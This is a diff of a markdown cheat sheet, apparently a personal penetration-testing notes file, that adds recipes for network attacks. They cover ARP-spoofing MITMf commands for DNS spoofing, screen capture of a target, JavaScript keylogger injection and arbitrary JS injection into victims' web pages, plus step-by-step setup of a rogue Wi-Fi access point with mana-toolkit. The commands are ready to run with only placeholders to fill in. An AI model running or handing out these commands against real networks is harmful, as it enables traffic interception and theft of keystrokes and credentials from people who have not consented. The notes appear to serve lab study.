@@ -100,7 +100,7 @@ airodump-ng --bssid <TargetMacAddress> --channel <Channel> --write <handshake> <
 ```bash 
 crunch [min][max][characters] -T[pattern] -o [FileName]
 ```
-Exampel:
+Example:
 ```bash
 crunch 6 8 abc12 -o test.txt
 ```
@@ -130,14 +130,46 @@ Use wireshark to sniff packets
 
 ## DNS Spoofing with MITMf
 1. Start the web server: `service apache2 start` (var/www/html)
-2. Configure the A records and add the domain you want to change into your IP address: `leafpad /etc/mitmf/mitmf.conf`
-*.___.com = <MyIPAddress>
+2. Configure the A records and add the domain you want to change into your IP address (*.___.com = <MyIPAddress>): 
+`leafpad /etc/mitmf/mitmf.conf`
 3. `mitmf --arp --spoof --gateway <routerIP> --target <targetIP> -i <interface> --dns`
 
-## Capturing Screen of Target
+## Capturing Screen of Target with MITMf
+Takes screenshots of the target machine 
+They are stored into ghe log directory `var/log/mitmf/
+(--screenshotter)
+```bash 
+mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --screen --interval <seconds>
+```
 
+## JS Keylogger with MITMf
+Injects javascript key logger into a client's webpage
+```bash
+mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --jskeylogger
+```
 
+## MITMf code injection
+```bash
+mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-payload <"javascriptcode">
+```
+```bash
+mitmf --arp --spoof --gateway <gatewayIP> --target <targetIP> <interface> --inject --js-file </path/to/jsfile>
+```
 
+**NOTE: if working in real network:**
+- Disconnect from virtual network --> Devices --> network --> uncheck (offline) 
+
+## Creating Fake Access Point 
+1. Download tool `apt-get intall manatoolkit`
+2. `start-nat-simple.sh`
+3. Edit the settings: `leafpad /etc/mana-toolkit/hostapd-mana.conf`
+- Change interface = wlan0
+- ssid = name of the fake network
+4. Edit: `leafpad /usr/share/mana-toolkit/run-mana/start-nat/simple.sh`
+- upstream = eth0
+- phy = wlan0
+5. start fake AP: `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
+6. Test it with phone or other machine, NOT host machine. 
 
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
